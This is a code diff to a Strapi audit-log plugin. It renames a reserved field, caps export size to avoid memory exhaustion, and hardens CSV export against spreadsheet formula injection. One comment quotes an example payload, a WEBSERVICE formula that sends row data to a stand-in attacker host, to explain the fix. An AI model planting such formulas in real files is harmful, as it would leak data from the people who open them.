@@ -5,13 +5,23 @@
  * document middleware — no audit-of-audit loop.
  */
 import type { Core } from "@strapi/strapi";
+import { toCsv } from "@vng/shared";
 
 const AUDIT_UID = "plugin::editorial.audit-log";
 
+/**
+ * Note on `entryDocumentId`: it holds the `documentId` of the *audited* entry, and
+ * is deliberately not called `documentId`. Strapi reserves that attribute name on
+ * every model and refuses to boot if a content type declares it —
+ * `transformContentTypesToModels` throws before the HTTP server ever starts. This
+ * plugin shipped with the reserved name and never surfaced it, because a separate
+ * packaging bug meant the plugin itself was never loaded (see
+ * `src/bootstrap/assert-plugins.ts`). Fixing the packaging exposed the crash.
+ */
 export interface AuditEntry {
   action: string;
   contentType?: string | null;
-  documentId?: string | null;
+  entryDocumentId?: string | null;
   locale?: string | null;
   entryTitle?: string | null;
   actorId?: number | null;
@@ -26,7 +36,7 @@ export interface AuditEntry {
 export interface AuditFilters {
   action?: string;
   contentType?: string;
-  documentId?: string;
+  entryDocumentId?: string;
   actorEmail?: string;
   from?: string; // ISO date lower bound (timestamp >=)
   to?: string; // ISO date upper bound (timestamp <=)
@@ -37,7 +47,7 @@ const CSV_COLUMNS = [
   "timestamp",
   "action",
   "contentType",
-  "documentId",
+  "entryDocumentId",
   "locale",
   "entryTitle",
   "fromStatus",
@@ -47,11 +57,20 @@ const CSV_COLUMNS = [
   "reason",
 ] as const;
 
+/**
+ * Ceiling on rows a single export may materialise. The whole result set is held
+ * in memory, serialised, and sent as one response body, so an unbounded export
+ * against a mature audit table is a memory-exhaustion vector — triggerable by an
+ * authorised user with no filters set. 100k rows is far past any real
+ * compliance query; narrow with the `from`/`to` filters instead.
+ */
+const EXPORT_ROW_LIMIT = 100_000;
+
 function buildWhere(filters: AuditFilters): Record<string, unknown> {
   const where: Record<string, unknown> = {};
   if (filters.action) where.action = filters.action;
   if (filters.contentType) where.contentType = filters.contentType;
-  if (filters.documentId) where.documentId = filters.documentId;
+  if (filters.entryDocumentId) where.entryDocumentId = filters.entryDocumentId;
   if (filters.actorEmail) where.actorEmail = filters.actorEmail;
   if (filters.from || filters.to) {
     where.timestamp = {
@@ -60,12 +79,6 @@ function buildWhere(filters: AuditFilters): Record<string, unknown> {
     };
   }
   return where;
-}
-
-function toCsvValue(value: unknown): string {
-  if (value === null || value === undefined) return "";
-  const str = String(value);
-  return /[",\n]/.test(str) ? `"${str.replace(/"/g, '""')}"` : str;
 }
 
 export default ({ strapi }: { strapi: Core.Strapi }) => ({
@@ -98,12 +111,21 @@ export default ({ strapi }: { strapi: Core.Strapi }) => ({
     };
   },
 
-  /** Export all matching rows as CSV or JSON (§4.5: "hỗ trợ xuất file audit"). */
+  /**
+   * Export all matching rows as CSV or JSON (§4.5: "hỗ trợ xuất file audit").
+   *
+   * CSV goes through `@vng/shared`'s `toCsv`, which neutralises spreadsheet
+   * formula prefixes. That matters here specifically: `reason`, `entryTitle` and
+   * `actorName` are written by editors, and a rejection reason of
+   * `=WEBSERVICE("https://attacker/?"&A1)` would exfiltrate the row the moment a
+   * compliance reviewer opened the export in Excel. The previous quote-only
+   * escaping did not help — spreadsheets strip quotes before evaluating.
+   */
   async exportEntries(filters: AuditFilters, format: "csv" | "json") {
     const rows = await strapi.db.query(AUDIT_UID).findMany({
       where: buildWhere(filters),
       orderBy: { timestamp: "desc" },
-      limit: 100000,
+      limit: EXPORT_ROW_LIMIT,
     });
 
     if (format === "json") {
@@ -114,12 +136,8 @@ export default ({ strapi }: { strapi: Core.Strapi }) => ({
       };
     }
 
-    const header = CSV_COLUMNS.join(",");
-    const lines = rows.map((row: Record<string, unknown>) =>
-      CSV_COLUMNS.map((col) => toCsvValue(row[col])).join(","),
-    );
     return {
-      body: [header, ...lines].join("\n"),
+      body: toCsv(CSV_COLUMNS, rows as Array<Record<string, unknown>>),
       contentType: "text/csv",
       filename: "audit-log.csv",
     };
